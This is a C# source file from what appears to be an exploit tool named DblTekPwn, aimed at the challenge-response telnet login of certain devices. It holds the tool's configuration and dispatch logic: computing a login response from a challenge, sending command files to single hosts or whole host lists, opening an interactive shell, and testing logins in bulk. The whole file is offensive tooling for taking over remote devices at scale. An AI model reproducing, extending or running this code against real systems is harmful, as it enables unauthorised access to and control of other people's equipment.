using System;
using System.IO;
using System.Text;

namespace DblTekPwn
{
    public class DblTekPwnConfig
    {
        public DblTekPwnMode DblTekPwnMode { get; set; }
        
        public string Challenge { get; set; }

        public string Host { get; set; }
        public string HostFile { get; set; }

        public string CommandFile { get; set; }

        public string OutputFile { get; set; }

        public TextWriter Output { get; set; }

        public DblTekPwnConfig()
        {
            DblTekPwnMode = DblTekPwnMode.None;

            Host = null;
            HostFile = null;

            OutputFile = null;
        }

        public static void Execute(DblTekPwnConfig config)
        {
            if (config.OutputFile == null)
                config.Output = Console.Out;
            else
                config.Output = File.CreateText(config.OutputFile);

            switch (config.DblTekPwnMode)
            {
                case DblTekPwnMode.ComputeResponse:
                    if (config.Challenge.StartsWith("N"))
                        config.Challenge = config.Challenge.Substring(1);
                    else if (config.Challenge.StartsWith("S"))
                        die("Error! Unsupported challenge mode 'S'");
                    config.Output.WriteLine(DblTekPwn.ComputeResponse(Convert.ToInt32(config.Challenge)));
                    break;
                case DblTekPwnMode.SendCommands:
                    string[] commands = File.ReadAllLines(config.CommandFile);
                    if (config.Host != null)
                        new DblTekPwn(config.Host).SendCommands(commands);
                    else
                    {
                        StreamReader reader = new StreamReader(config.HostFile);
                        while (reader.BaseStream.Position < reader.BaseStream.Length)
                        {
                            string host = sanityReadLine(reader);
                            string[] parts = host.Split(':');
                            int port = parts.Length > 1 ? Convert.ToInt32(parts[1]) : 23;
                            config.Output.WriteLine(string.Format("{0} {1}", host, new DblTekPwn(parts[0], port).SendCommands(commands)));
                            config.Output.Flush();
                        }
                        reader.Close();
                    }
                    break;
                case DblTekPwnMode.Shell:
                    new DblTekPwn(config.Host).Shell();
                    break;
                case DblTekPwnMode.TestLogin:
                    if (config.Host != null)
                        config.Output.WriteLine(string.Format("{0} {1}", config.Host, new DblTekPwn(config.Host).TestLogin()));
                    else
                    {
                        StreamReader reader = new StreamReader(config.HostFile);
                        while (reader.BaseStream.Position < reader.BaseStream.Length)
                        {
                            string host = sanityReadLine(reader);
                            string[] parts = host.Split(':');
                            int port = parts.Length > 1 ? Convert.ToInt32(parts[1]) : 23;
                            config.Output.WriteLine(string.Format("{0} {1}", host, new DblTekPwn(parts[0], port).TestLogin()));
                            config.Output.Flush();
                        }
                        reader.Close();
                    }
                    break;
            }
        }

        private static string sanityReadLine(StreamReader reader)
        {
            StringBuilder sb = new StringBuilder();
            char c;
            while ((c = (char)reader.BaseStream.ReadByte()) != '\n')
                sb.Append(c);
            return sb.ToString();
        }

        private static void die(string msg = "", params string[] args)
        {
            Console.WriteLine(msg, args);
            Environment.Exit(0);
        }
    }

    public enum DblTekPwnMode
    {
        None,
        ComputeResponse,
        SendCommands,
        Shell,
        TestLogin
    }
}

